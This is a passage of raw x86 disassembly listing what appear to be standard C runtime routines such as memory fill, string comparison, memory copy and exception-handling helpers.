  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
